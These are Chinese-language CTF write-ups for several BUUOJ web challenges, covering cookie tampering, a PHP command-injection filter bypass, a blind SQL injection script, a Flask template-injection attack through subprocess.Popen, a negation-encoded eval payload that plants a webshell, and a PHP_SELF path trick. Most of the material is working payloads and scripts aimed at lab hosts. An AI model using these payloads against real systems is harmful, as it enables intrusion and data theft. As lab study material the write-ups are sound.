## [BSidesCF 2019]Kookie
根据提示,修改cookie
```
monster:admin
```
![image](https://user-images.githubusercontent.com/81904597/115979059-3793dc00-a5b6-11eb-810f-e0a50bd9f6f4.png)

得到回显 set-cookie:设置username
```
monster:admin;username:admin
```
![image](https://user-images.githubusercontent.com/81904597/115979070-44183480-a5b6-11eb-85e1-2aa1baea061b.png)
## [极客大挑战 2019]RCE ME
题目源码
```
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
    $json = $_REQUEST['cmd'];

    if (!is_string($json)) {
        echo 'Hacking attempt detected<br/><br/>';
    } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
        echo 'Hacking attempt detected<br/><br/>';
    } else {
        echo 'Attempting to run command:<br/>';
        $cmd = json_decode($json, true)['cmd'];
        if ($cmd !== NULL) {
            system($cmd);
        } else {
            echo 'Invalid input';
        }
        echo '<br/><br/>';
    }
}

?>
```
```
?cmd=%0a{"cmd":"/bin/cat /home/rceservice/flag"%0a}
```
https://blog.csdn.net/rfrder/article/details/110573955

## [WUSTCTF2020]颜值成绩查询
过滤了空格的盲注，这里直接贴payload
```
import requests

url = 'http://f4efb6bb-bd98-43f6-b5f0-33f3dac0e142.node3.buuoj.cn/?stunum='

flag=''
for i in range(1,50):
    min=32
    max=125
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            break

        payload="if(ascii(substr((select/**/value/**/from/**/flag),%d,1))<%d,1,2)"%(i,j)

        r=requests.get(url=url+payload).text
        #print(r)

        if 'your score is: 100' in r:
            max=j
        else :
            min=j
```
## [CSCCTF 2019 Qual]FlaskLight
查看源代码提示 search get传参
![image](https://user-images.githubusercontent.com/81904597/115979184-0ec01680-a5b7-11eb-86a2-e0787dd7b43c.png)
然后我们准备寻找os类
```
{{[].__class__.__base__.__subclasses__()}}
```
无奈找不到,然后看一眼wp，需要找存在Popen的类来执行命令
#查找可以利用的类 利用subprocess.Popen执行命令
```
import requests
import re
import html
import time

index = 0
for i in range(170, 1000):
    try:
        url = "http://878e7c4d-d15f-432c-bcb4-d327685a1f55.node3.buuoj.cn/?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}"
        r = requests.get(url)
        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text)
        time.sleep(0.1)
        # print(res)
        # print(r.text)
        res = html.unescape(res[0])
        print(str(i) + " | " + res)
        if "subprocess.Popen" in res:
            index = i
            break
    except:
        continue
print("indexo of subprocess.Popen:" + str(index))
```
贴一个查找类的通用脚本
```
import requests
import html
import time

for i in range(0,300):
    time.sleep(0.06)
    url='http://878e7c4d-d15f-432c-bcb4-d327685a1f55.node3.buuoj.cn/?search={{\'\'.__class__.__mro__[2].__subclasses__()[%d]}}' %(i)
    r = requests.get(url)
    print(url)
    if "subprocess.Popen" in html.unescape(r.text):
        print(i)
        break
```
```
?search={{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
```
## [极客大挑战 2019]RCE ME
一开始给了源码
```
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}
// ?>
```
明显的无数字字母rce，但是长度要在40以内
所以只能使用取反
先尝试执行phpinfo()
```
(~%8F%97%8F%96%91%99%90)();
```
![image](https://user-images.githubusercontent.com/81904597/115979236-56df3900-a5b7-11eb-9ad3-42ea1015211c.png)

禁用了一堆命令执行的函数,但是可以写木马
(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6);
能连shell但是执行不了命令
使用插件bypass(心酸)
![image](https://user-images.githubusercontent.com/81904597/115979252-68284580-a5b7-11eb-802a-6f9a816ccaec.png)
![image](https://user-images.githubusercontent.com/81904597/115979256-70808080-a5b7-11eb-8c51-9b25deb4dba1.png)
## [Zer0pts2020]Can you guess it?
```
<?php
include 'config.php'; // FLAG is defined in config.php
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}
if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}
$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
```
```
/index.php/config.php/%80?source

```
